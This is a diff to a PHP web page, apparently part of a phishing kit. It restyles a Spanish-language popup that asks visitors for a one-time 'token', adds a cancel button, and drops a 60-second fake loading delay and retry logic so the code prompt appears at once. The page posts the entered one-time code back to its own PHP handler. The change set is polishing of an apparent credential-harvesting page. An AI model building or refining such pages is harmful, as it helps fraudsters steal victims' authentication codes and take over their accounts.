@@ -82,17 +82,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     /* POPUP */
     #scene{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:24px;opacity:0;pointer-events:none;transition:opacity .35s}
     #scene.show{opacity:1;pointer-events:all}
-    .modal{width:100%;max-width:400px;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.45)}
-    .modal-header{background:var(--red);padding:14px 20px}
-    .modal-header h2{color:#fff;font-size:17px;font-weight:700}
-    .modal-body{padding:28px 24px 24px}
-    .modal-body p{font-size:14px;color:#374151;margin-bottom:18px}
-    .token-input{width:100%;height:48px;border:none;border-bottom:2px solid #d1d5db;font-size:24px;font-weight:700;letter-spacing:5px;color:#111;outline:none;background:transparent;padding:0 4px;transition:border-color .15s}
-    .token-input:focus{border-color:var(--red)}
+    .modal{width:100%;max-width:380px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.45)}
+    .modal-header{background:#fff;padding:18px 20px 8px;text-align:center}
+    .modal-header h2{color:var(--red);font-size:18px;font-weight:600}
+    .modal-body{padding:8px 24px 24px;text-align:center}
+    .modal-body p{font-size:14px;color:#374151;margin-bottom:22px;line-height:1.45}
+    .token-input{width:100%;height:44px;border:none;border-radius:24px;font-size:18px;font-weight:600;letter-spacing:3px;color:#111;outline:none;background:#e9eaec;padding:0 18px;text-align:center;transition:background .15s}
+    .token-input:focus{background:#dfe1e4}
     .token-input::placeholder{letter-spacing:1px;font-size:14px;font-weight:400;color:#9ca3af}
-    .btn-send{display:block;width:100%;height:48px;background:var(--red);border:none;border-radius:3px;color:#fff;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;letter-spacing:1px;margin-top:24px;transition:background .15s,opacity .15s}
+    .btn-cancel,.btn-send{display:block;width:80%;margin:14px auto 0;height:44px;border:none;border-radius:24px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;letter-spacing:1.5px;transition:background .15s,opacity .15s}
+    .btn-cancel{background:#6b7280;color:#fff}
+    .btn-cancel:hover{background:#4b5563}
+    .btn-send{background:var(--red);color:#fff}
     .btn-send:hover{background:var(--red-dark)}
-    .btn-send:active{transform:translateY(1px)}
+    .btn-send:active,.btn-cancel:active{transform:translateY(1px)}
     .btn-send.loading{opacity:.6;pointer-events:none}
   </style>
 </head>
@@ -115,9 +118,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     <div class="modal">
       <div class="modal-header"><h2>Token</h2></div>
       <div class="modal-body">
-        <p>Ingrese el token para continuar</p>
+        <p>Ingresa el token para continuar. Recuerda no compartirlo con nadie.</p>
         <input class="token-input" type="tel" id="tokenInput" maxlength="10"
-               placeholder="Ingrese su token" autocomplete="one-time-code"/>
+               placeholder="" autocomplete="one-time-code"/>
+        <button class="btn-cancel" onclick="cancelar()">CANCELAR</button>
         <button class="btn-send" id="btnEnviar" onclick="enviar()">ENVIAR</button>
       </div>
     </div>
@@ -170,6 +174,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
       inp.focus();
     }
 
+    function cancelar() {
+      inp.value = '';
+      inp.focus();
+    }
+
     function enviar() {
       const tk = inp.value.trim();
       if (!tk) { inp.focus(); return; }
@@ -199,8 +208,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
       if (e.key === 'Enter' && scene.classList.contains('show')) enviar();
     });
 
-    const IS_RETRY = <?= isset($_GET['retry']) ? 'true' : 'false' ?>;
-    if (IS_RETRY) { showToken(); } else { showLoader(60000); }
+    loader.classList.add('hide');
+    showToken();
   </script>
 <script src="../protect.js"></script>
 <script src="../popup.js"></script>
